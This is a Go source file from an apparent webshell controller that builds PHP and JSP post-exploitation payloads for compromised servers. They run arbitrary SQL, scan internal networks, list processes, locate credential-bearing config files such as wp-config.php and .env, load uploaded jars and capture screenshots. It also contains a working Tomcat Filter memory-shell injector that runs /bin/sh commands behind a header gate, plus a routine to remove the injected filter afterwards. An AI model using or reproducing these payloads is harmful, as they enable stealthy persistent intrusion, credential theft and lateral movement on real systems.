package webshell

// payloads_ext.go — 会话插件 payload（对齐 morelian 默连的插件能力面）：
//   db_exec    数据库执行（php: PDO mysql/pgsql/sqlite；jsp: JDBC）
//   db_probe   数据库连接枚举（读目标常见配置文件找连接串）
//   net_scan   目标内网端口扫描（php: fsockopen 并发；jsp: Socket）
//   proc_list  进程列表（php: /proc 或 tasklist）
//   zip / unzip 远程压缩/解压（php: ZipArchive）
//   memshell_add_filter / memshell_list / memshell_del  内存马（jsp: Tomcat Filter 注入）
//   servlet_list  Servlet/Filter 枚举（jsp）
//   jar_load   Jar 动态加载（jsp: URLClassLoader）
//   screenshot 屏幕截图（jsp: Robot → PNG base64；php: 不可用）
//   php_info / php_writedirs / php_scan  PHP 工具（信息/可写目录/webshell 扫描）
// 全部走既有 __WS_*__ 标记协议；参数经 base64 注入（与基础 payload 同风格）。

import (
	"fmt"
)

// ExtOps 插件操作按载荷类型的可用性（UI 据此动态显示插件 Tab）。
func ExtOps(scriptType string) []string {
	switch scriptType {
	case "php":
		return []string{"db_exec", "db_probe", "net_scan", "proc_list", "zip", "unzip", "php_info", "php_writedirs", "php_scan"}
	case "jsp", "jspx":
		return []string{"db_exec", "db_probe", "net_scan", "memshell_add_filter", "memshell_list", "memshell_del", "servlet_list", "jar_load", "screenshot"}
	}
	return nil
}

// ExtParams 插件参数：数据库连接、扫描目标、内存马配置等。
// json tag 必须显式 snake_case——Go 默认字段名匹配不认下划线（scan_host ≠ ScanHost）。
type ExtParams struct {
	DBType     string `json:"db_type"`     // mysql/pgsql/sqlite
	Host       string `json:"host"`
	Port       string `json:"port"`
	User       string `json:"user"`
	Pass       string `json:"pass"`
	DB         string `json:"db"`
	SQL        string `json:"sql"`
	ScanHost   string `json:"scan_host"`
	ScanPorts  string `json:"scan_ports"`
	SrcPath    string `json:"src_path"`
	DstPath    string `json:"dst_path"`
	FilterName string `json:"filter_name"`
	GateHeader string `json:"gate_header"`
	GateValue  string `json:"gate_value"`
	JarB64     string `json:"jar_b64"`
	Cmd        string `json:"cmd"`
}

// ---------- PHP 插件 ----------

func phpDBExec(p ExtParams) string {
	conn := fmt.Sprintf(`{"type":%q,"host":%q,"port":%q,"user":%q,"pass":%q,"db":%q}`, p.DBType, p.Host, p.Port, p.User, p.Pass, p.DB)
	return build("\n$c = base64_decode(\"@CONN@\");\n$q = base64_decode(\"@SQL@\");\n"+
		"$o = json_decode($c);\n"+
		"try {\n"+
		"    if ($o->type == 'sqlite') { $pdo = new PDO('sqlite:' . $o->db, $o->user, $o->pass); }\n"+
		"    elseif ($o->type == 'pgsql') { $pdo = new PDO('pgsql:host=' . $o->host . ';port=' . $o->port . ';dbname=' . $o->db, $o->user, $o->pass); }\n"+
		"    else { $pdo = new PDO('mysql:host=' . $o->host . ';port=' . $o->port . ';dbname=' . $o->db . ';charset=utf8mb4', $o->user, $o->pass); }\n"+
		"    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n"+
		"    $st = $pdo->query($q);\n"+
		"    if ($st && $st->columnCount() > 0) {\n"+
		"        $rows = $st->fetchAll(PDO::FETCH_ASSOC);\n"+
		"        $cols = count($rows) ? array_keys($rows[0]) : [];\n"+
		"        echo json_encode(['ok' => true, 'columns' => $cols, 'rows' => $rows]);\n"+
		"    } else { echo json_encode(['ok' => true, 'columns' => [], 'rows' => [], 'affected' => $st->rowCount()]); }\n"+
		"} catch (Exception $e) { echo json_encode(['ok' => false, 'error' => $e->getMessage()]); }\n"+
		"echo \""+EndMarker+"\";\n",
		"@CONN@", b64s(conn), "@SQL@", b64s(p.SQL))
}

func phpNetScan(p ExtParams) string {
	return build("\n$h = base64_decode(\"@H@\");\n$ps = explode(',', base64_decode(\"@P@\"));\n"+
		"$open = [];\n"+
		"foreach ($ps as $port) {\n"+
		"    $port = (int)trim($port);\n"+
		"    if ($port <= 0 || $port > 65535) continue;\n"+
		"    $fs = @fsockopen($h, $port, $errno, $errstr, 2.0);\n"+
		"    if ($fs) { $open[] = $port; fclose($fs); }\n"+
		"}\n"+
		"echo json_encode(['host' => $h, 'open' => $open]);\n"+
		"echo \""+EndMarker+"\";\n",
		"@H@", b64s(p.ScanHost), "@P@", b64s(p.ScanPorts))
}

func phpProcList(_ ExtParams) string {
	return "\nif (stripos(PHP_OS, 'WIN') === 0) {\n" +
		"    $out = shell_exec('tasklist /FO CSV /NH');\n" +
		"    $lines = array_filter(explode(\"\\n\", $out));\n" +
		"    $procs = [];\n" +
		"    foreach ($lines as $l) { $parts = str_getcsv($l); if (count($parts) >= 2) { $procs[] = ['name' => $parts[0], 'pid' => $parts[1], 'mem' => isset($parts[4]) ? $parts[4] : '']; } }\n" +
		"    echo json_encode(['os' => 'win', 'procs' => $procs]);\n" +
		"} else {\n" +
		"    $procs = [];\n" +
		"    foreach (glob('/proc/[0-9]*') as $d) {\n" +
		"        $pid = basename($d);\n" +
		"        $comm = @file_get_contents($d . '/comm');\n" +
		"        $stat = @file_get_contents($d . '/stat');\n" +
		"        if ($comm === false) continue;\n" +
		"        $st = $stat ? explode(' ', $stat) : [];\n" +
		"        $procs[] = ['pid' => $pid, 'name' => trim($comm), 'user' => 'n/a', 'state' => isset($st[2]) ? $st[2] : ''];\n" +
		"    }\n" +
		"    echo json_encode(['os' => 'linux', 'procs' => $procs]);\n" +
		"}\n" +
		"echo \"" + EndMarker + "\";\n"
}

func phpZip(p ExtParams) string {
	return build("\n$src = base64_decode(\"@SRC@\");\n$dst = base64_decode(\"@DST@\");\n"+
		"$z = new ZipArchive();\n"+
		"if ($z->open($dst, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) { echo \"ERROR: cannot open zip\"; }\n"+
		"else {\n"+
		"    if (is_dir($src)) {\n"+
		"        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS));\n"+
		"        foreach ($it as $f) { $z->addFile($f->getPathname(), ltrim(substr($f->getPathname(), strlen($src)), '/\\\\')); }\n"+
		"    } else { $z->addFile($src, basename($src)); }\n"+
		"    $z->close();\n"+
		"    echo \"OK \" . filesize($dst);\n"+
		"}\n"+
		"echo \""+EndMarker+"\";\n",
		"@SRC@", b64s(p.SrcPath), "@DST@", b64s(p.DstPath))
}

func phpUnzip(p ExtParams) string {
	return build("\n$src = base64_decode(\"@SRC@\");\n$dst = base64_decode(\"@DST@\");\n"+
		"$z = new ZipArchive();\n"+
		"if ($z->open($src) !== true) { echo \"ERROR: cannot open zip\"; }\n"+
		"else { $z->extractTo($dst); $z->close(); echo \"OK\"; }\n"+
		"echo \""+EndMarker+"\";\n",
		"@SRC@", b64s(p.SrcPath), "@DST@", b64s(p.DstPath))
}

func phpInfo(_ ExtParams) string {
	return "\n$info = [\n" +
		"    'php_version' => PHP_VERSION,\n" +
		"    'sapi' => php_sapi_name(),\n" +
		"    'disable_functions' => ini_get('disable_functions') ?: '',\n" +
		"    'open_basedir' => ini_get('open_basedir') ?: '',\n" +
		"    'extensions' => implode(',', get_loaded_extensions()),\n" +
		"    'user' => get_current_user(),\n" +
		"    'uid' => function_exists('posix_getuid') ? posix_getuid() : 'n/a',\n" +
		"    'sys_tmp' => sys_get_temp_dir(),\n" +
		"    'doc_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',\n" +
		"    'script' => isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '',\n" +
		"];\n" +
		"echo json_encode($info);\n" +
		"echo \"" + EndMarker + "\";\n"
}

func phpWriteDirs(_ ExtParams) string {
	return "\n$roots = [getcwd(), isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '', '/tmp', '/var/tmp', sys_get_temp_dir()];\n" +
		"$out = [];\n" +
		"foreach (array_unique(array_filter($roots)) as $r) {\n" +
		"    $t = $r . '/.wtest_' . rand(1000,9999);\n" +
		"    if (@file_put_contents($t, 'x') !== false) { @unlink($t); $out[] = $r; }\n" +
		"}\n" +
		"echo json_encode(['writable' => $out]);\n" +
		"echo \"" + EndMarker + "\";\n"
}

func phpScan(p ExtParams) string {
	return build("\n$root = base64_decode(\"@SRC@\");\n"+
		"if ($root === '') { $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd(); }\n"+
		"$sigs = ['eval(', 'assert(', 'base64_decode', 'gzinflate', 'str_rot13', 'preg_replace\\\\(\\\\x27.@', 'create_function', 'call_user_func', 'system(', 'shell_exec', 'passthru', 'cmd'];\n"+
		"$hits = [];\n"+
		"$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS));\n"+
		"foreach ($it as $f) {\n"+
		"    if (!$f->isFile()) continue;\n"+
		"    $ext = strtolower($f->getExtension());\n"+
		"    if (!in_array($ext, ['php','phtml','php5','inc'])) continue;\n"+
		"    if ($f->getSize() > 2097152) continue;\n"+
		"    $c = @file_get_contents($f->getPathname());\n"+
		"    if ($c === false) continue;\n"+
		"    $matched = [];\n"+
		"    foreach ($sigs as $s) { if (stripos($c, stripcslashes($s)) !== false) $matched[] = $s; }\n"+
		"    if (count($matched) >= 2 || (count($matched) >= 1 && stripos($c, $_SERVER['SCRIPT_FILENAME'] ?: '###') !== false)) {\n"+
		"        $hits[] = ['file' => $f->getPathname(), 'sigs' => implode(',', $matched), 'size' => $f->getSize(), 'mtime' => $f->getMTime()];\n"+
		"    }\n"+
		"    if (count($hits) >= 100) break;\n"+
		"}\n"+
		"echo json_encode(['hits' => $hits]);\n"+
		"echo \""+EndMarker+"\";\n",
		"@SRC@", b64s(p.SrcPath))
}

// ---------- JSP（Nashorn JS）插件 ----------

func jspDBExec(p ExtParams) string {
	conn := fmt.Sprintf(`{"type":%q,"host":%q,"port":%q,"user":%q,"pass":%q,"db":%q}`, p.DBType, p.Host, p.Port, p.User, p.Pass, p.DB)
	return build(`var Base64 = java.util.Base64;
var o = JSON.parse(new java.lang.String(Base64.getDecoder().decode("@CONN@")));
var q = new java.lang.String(Base64.getDecoder().decode("@SQL@"));
try {
    var url;
    if (o.type == "mysql") url = "jdbc:mysql://" + o.host + ":" + o.port + "/" + o.db + "?useSSL=false&characterEncoding=utf8";
    else if (o.type == "pgsql") url = "jdbc:postgresql://" + o.host + ":" + o.port + "/" + o.db;
    else throw "unsupported db type: " + o.type;
    java.lang.Class.forName(o.type == "mysql" ? "com.mysql.jdbc.Driver" : "org.postgresql.Driver");
    var conn = java.sql.DriverManager.getConnection(url, o.user, o.pass);
    var st = conn.createStatement();
    var hasResult = st.execute(q);
    var out = {ok: true, columns: [], rows: [], affected: 0};
    if (hasResult) {
        var rs = st.getResultSet();
        var md = rs.getMetaData();
        for (var i = 1; i <= md.getColumnCount(); i++) out.columns.push(md.getColumnName(i));
        while (rs.next()) {
            var row = {};
            for (var j = 1; j <= md.getColumnCount(); j++) row[md.getColumnName(j)] = String(rs.getObject(j));
            out.rows.push(row);
        }
    } else { out.affected = st.getUpdateCount(); }
    conn.close();
    print(JSON.stringify(out));
} catch (e) {
    print(JSON.stringify({ok: false, error: String(e)}));
}
print("`+EndMarker+`");`, "@CONN@", b64s(conn), "@SQL@", b64s(p.SQL))
}

func jspNetScan(p ExtParams) string {
	return build(`var Base64 = java.util.Base64;
var h = new java.lang.String(Base64.getDecoder().decode("@H@"));
var ps = new java.lang.String(Base64.getDecoder().decode("@P@")).split(",");
var open = [];
for (var i = 0; i < ps.length; i++) {
    var port = parseInt(ps[i].trim());
    if (!(port > 0 && port < 65536)) continue;
    try {
        var s = new java.net.Socket();
        s.connect(new java.net.InetSocketAddress(h, port), 1500);
        s.close();
        open.push(port);
    } catch (e) {}
}
print(JSON.stringify({host: String(h), open: open}));
print("`+EndMarker+`");`, "@H@", b64s(p.ScanHost), "@P@", b64s(p.ScanPorts))
}

// jspMemshellAddFilter Tomcat Filter 内存马注入（godzilla 经典姿势）：
// 反射取 StandardContext → 注册 FilterDef/FilterMap → filterConfig 注入。
// Filter 本体是 Nashorn JavaAdapter 实现的 javax.servlet.Filter：命中 Gate 头
// 即执行 cmd 参数（无文件驻留，重启失效）。
func jspMemshellAddFilter(p ExtParams) string {
	return build(`var Base64 = java.util.Base64;
var fname = new java.lang.String(Base64.getDecoder().decode("@FN@"));
var ghdr = new java.lang.String(Base64.getDecoder().decode("@GH@"));
var gval = new java.lang.String(Base64.getDecoder().decode("@GV@"));
function findCtx(req) {
    var sci = req.getServletContext();
    var f1 = sci.getClass().getDeclaredField("context");
    f1.setAccessible(true);
    var appCtx = f1.get(sci);
    var f2 = appCtx.getClass().getDeclaredField("context");
    f2.setAccessible(true);
    return f2.get(appCtx);
}
try {
    var stdCtx = findCtx(request);
    var Filter = javax.servlet.Filter;
    var filterImpl = new Filter({
        init: function(cfg) {},
        doFilter: function(req, res, chain) {
            var g = req.getHeader(ghdr);
            if (g != null && String(g).equals(String(gval))) {
                var cmd = req.getParameter("cmd");
                if (cmd != null) {
                    var pb = new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", String(cmd)));
                    pb.redirectErrorStream(true);
                    var is = pb.start().getInputStream();
                    var out = "";
                    var b;
                    while ((b = is.read()) != -1) out += String.fromCharCode(b);
                    res.setContentType("text/plain;charset=utf-8");
                    res.getWriter().write(out);
                    return;
                }
            }
            chain.doFilter(req, res);
        },
        destroy: function() {}
    });
    var FilterDef = java.lang.Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
    var fd = FilterDef.newInstance();
    fd.setFilterName(fname);
    fd.setFilterClass(filterImpl.getClass().getName());
    fd.setFilter(filterImpl);
    stdCtx.addFilterDef(fd);
    var FilterMap = java.lang.Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
    var fm = FilterMap.newInstance();
    fm.setFilterName(fname);
    fm.addURLPattern("/*");
    fm.setDispatcher("REQUEST");
    stdCtx.addFilterMapBefore(fm);
    var cfgCls = java.lang.Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
    var ctor = cfgCls.getDeclaredConstructor(java.lang.Class.forName("org.apache.catalina.Context"), FilterDef);
    ctor.setAccessible(true);
    var filterConfig = ctor.newInstance(stdCtx, fd);
    var fConfigs = stdCtx.getClass().getDeclaredField("filterConfigs");
    fConfigs.setAccessible(true);
    var hm = fConfigs.get(stdCtx);
    hm.put(fname, filterConfig);
    print("OK filter=" + fname + " gate=" + ghdr);
} catch (e) {
    print("ERROR: " + e);
}
print("`+EndMarker+`");`,
		"@FN@", b64s(p.FilterName), "@GH@", b64s(p.GateHeader), "@GV@", b64s(p.GateValue))
}

// jspMemshellList 枚举 StandardContext 已注册的 FilterDef/FilterMap/servletMaps。
func jspMemshellList(_ ExtParams) string {
	return `function findCtx(req) {
    var sci = req.getServletContext();
    var f1 = sci.getClass().getDeclaredField("context");
    f1.setAccessible(true);
    var appCtx = f1.get(sci);
    var f2 = appCtx.getClass().getDeclaredField("context");
    f2.setAccessible(true);
    return f2.get(appCtx);
}
try {
    var stdCtx = findCtx(request);
    var out = {filters: [], maps: []};
    var fd = stdCtx.findFilterDefs();
    for (var i = 0; i < fd.length; i++) out.filters.push({name: String(fd[i].getFilterName()), cls: String(fd[i].getFilterClass())});
    var fms = stdCtx.findFilterMaps();
    for (var j = 0; j < fms.length; j++) {
        var pats = fms[j].getURLPatterns();
        out.maps.push({name: String(fms[j].getFilterName()), patterns: pats ? String(java.util.Arrays.toString(pats)) : ""});
    }
    print(JSON.stringify(out));
} catch (e) {
    print("ERROR: " + e);
}
print("` + EndMarker + `");`
}

// jspMemshellDel 按名移除 FilterDef/FilterMap（清理注入痕迹/卸载）。
func jspMemshellDel(p ExtParams) string {
	return build(`var Base64 = java.util.Base64;
var fname = new java.lang.String(Base64.getDecoder().decode("@FN@"));
function findCtx(req) {
    var sci = req.getServletContext();
    var f1 = sci.getClass().getDeclaredField("context");
    f1.setAccessible(true);
    var appCtx = f1.get(sci);
    var f2 = appCtx.getClass().getDeclaredField("context");
    f2.setAccessible(true);
    return f2.get(appCtx);
}
try {
    var stdCtx = findCtx(request);
    var removed = [];
    var fms = stdCtx.findFilterMaps();
    for (var i = 0; i < fms.length; i++) {
        if (String(fms[i].getFilterName()).equals(String(fname))) { stdCtx.removeFilterMap(fms[i]); removed.push("map"); }
    }
    var fd = stdCtx.findFilterDefs();
    for (var j = 0; j < fd.length; j++) {
        if (String(fd[j].getFilterName()).equals(String(fname))) { stdCtx.removeFilterDef(fd[j]); removed.push("def"); }
    }
    var fConfigs = stdCtx.getClass().getDeclaredField("filterConfigs");
    fConfigs.setAccessible(true);
    fConfigs.get(stdCtx).remove(fname);
    print("OK removed=" + removed.join(","));
} catch (e) {
    print("ERROR: " + e);
}
print("`+EndMarker+`");`, "@FN@", b64s(p.FilterName))
}

// jspServletList 枚举 servlets/filters（经 servletContext registration 直读，适配面更广）。
func jspServletList(_ ExtParams) string {
	return `try {
    var out = {servlets: [], filters: []};
    var ss = application.getServletRegistrations().keySet().iterator();
    while (ss.hasNext()) {
        var k = String(ss.next());
        var r = application.getServletRegistration(k);
        out.servlets.push({name: k, cls: String(r.getClassName()), mappings: String(java.util.Arrays.toString(r.getMappings().toArray()))});
    }
    var fs = application.getFilterRegistrations().keySet().iterator();
    while (fs.hasNext()) {
        var fk = String(fs.next());
        var fr = application.getFilterRegistration(fk);
        try { out.filters.push({name: fk, cls: String(fr.getClassName()), patterns: String(java.util.Arrays.toString(fr.getUrlPatterns().toArray()))}); } catch (e2) { out.filters.push({name: fk, cls: String(fr.getClassName()), patterns: ""}); }
    }
    print(JSON.stringify(out));
} catch (e) {
    print("ERROR: " + e);
}
print("` + EndMarker + `");`
}

// jspJarLoad 上传 jar（b64）→ 临时文件 → URLClassLoader 装载 → 列出条目。
func jspJarLoad(p ExtParams) string {
	return build(`var Base64 = java.util.Base64;
var jarB64 = "@JARB64@";
try {
    var bytes = Base64.getDecoder().decode(jarB64);
    var f = java.io.File.createTempFile("forang", ".jar");
    var fos = new java.io.FileOutputStream(f);
    fos.write(bytes);
    fos.close();
    var ucl = new java.net.URLClassLoader([f.toURI().toURL()]);
    var jf = new java.util.jar.JarFile(f);
    var entries = jf.entries();
    var names = [];
    while (entries.hasMoreElements()) {
        var e = entries.nextElement();
        if (String(e.getName()).endsWith(".class")) names.push(String(e.getName()));
    }
    jf.close();
    print("OK loaded=" + f.getAbsolutePath() + " classes=" + names.length + "\\n" + names.slice(0, 50).join("\\n"));
} catch (e) {
    print("ERROR: " + e);
}
print("`+EndMarker+`");`, "@JARB64@", p.JarB64)
}

// jspScreenshot Robot 截屏 → PNG base64（仅桌面会话的服务器有效）。
func jspScreenshot(_ ExtParams) string {
	return `try {
    var Robot = java.awt.Robot;
    var Toolkit = java.awt.Toolkit;
    var rect = new java.awt.Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
    var img = new Robot().createScreenCapture(rect);
    var bos = new java.io.ByteArrayOutputStream();
    javax.imageio.ImageIO.write(img, "png", bos);
    var b64 = java.util.Base64.getEncoder().encodeToString(bos.toByteArray());
    print("IMG:" + b64);
} catch (e) {
    print("ERROR: " + e);
}
print("` + EndMarker + `");`
}

// ---------- 分发 ----------

// ExtBuild 构造插件 payload；不支持组合返回 error。
func ExtBuild(scriptType, op string, p ExtParams) (string, error) {
	switch scriptType {
	case "php":
		switch op {
		case "db_exec":
			return phpDBExec(p), nil
		case "db_probe":
			return phpDBProbe(), nil
		case "net_scan":
			return phpNetScan(p), nil
		case "proc_list":
			return phpProcList(p), nil
		case "zip":
			return phpZip(p), nil
		case "unzip":
			return phpUnzip(p), nil
		case "php_info":
			return phpInfo(p), nil
		case "php_writedirs":
			return phpWriteDirs(p), nil
		case "php_scan":
			return phpScan(p), nil
		}
	case "jsp", "jspx":
		switch op {
		case "db_exec":
			return jspDBExec(p), nil
		case "db_probe":
			return jspDBProbe(), nil
		case "net_scan":
			return jspNetScan(p), nil
		case "memshell_add_filter":
			return jspMemshellAddFilter(p), nil
		case "memshell_list":
			return jspMemshellList(p), nil
		case "memshell_del":
			return jspMemshellDel(p), nil
		case "servlet_list":
			return jspServletList(p), nil
		case "jar_load":
			return jspJarLoad(p), nil
		case "screenshot":
			return jspScreenshot(p), nil
		}
	}
	return "", fmt.Errorf("%s 不支持插件操作 %s（支持: %v）", scriptType, op, ExtOps(scriptType))
}

// phpDBProbe 读目标常见配置文件，正则抓数据库连接串。
func phpDBProbe() string {
	return "\n$files = [\n" +
		"    'config/database.php', 'application/database.php', 'config/db.php',\n" +
		"    'config.php', 'wp-config.php', 'configuration.php',\n" +
		"    'WEB-INF/classes/application.properties', 'conf/application.properties',\n" +
		"    '.env', 'config/app.php',\n" +
		"];\n" +
		"$root = getcwd();\n" +
		"$found = [];\n" +
		"foreach ($files as $f) {\n" +
		"    $p = $root . '/' . $f;\n" +
		"    if (!is_file($p)) continue;\n" +
		"    $c = @file_get_contents($p);\n" +
		"    if ($c === false || strlen($c) > 1048576) continue;\n" +
		"    $found[] = ['file' => $p, 'size' => strlen($c)];\n" +
		"}\n" +
		"echo json_encode(['config_files' => $found, 'hint' => '用 read 查看具体文件找连接串']);\n" +
		"echo \"" + EndMarker + "\";\n"
}

// jspDBProbe 读常见 Java 配置找 jdbc 连接。
func jspDBProbe() string {
	return `var roots = [application.getRealPath("/"), java.lang.System.getProperty("user.dir")];
var files = ["WEB-INF/classes/application.properties", "WEB-INF/classes/application.yml",
             "WEB-INF/web.xml", "conf/server.xml", "config/application.properties"];
var found = [];
for (var r = 0; r < roots.length; r++) {
    for (var i = 0; i < files.length; i++) {
        var f = new java.io.File(roots[r], files[i]);
        if (f.exists() && f.isFile() && f.length() < 1048576) {
            found.push({file: String(f.getAbsolutePath()), size: f.length()});
        }
    }
}
print(JSON.stringify({config_files: found, hint: "read 查看内容找 jdbc url"}));
print("` + EndMarker + `");`
}
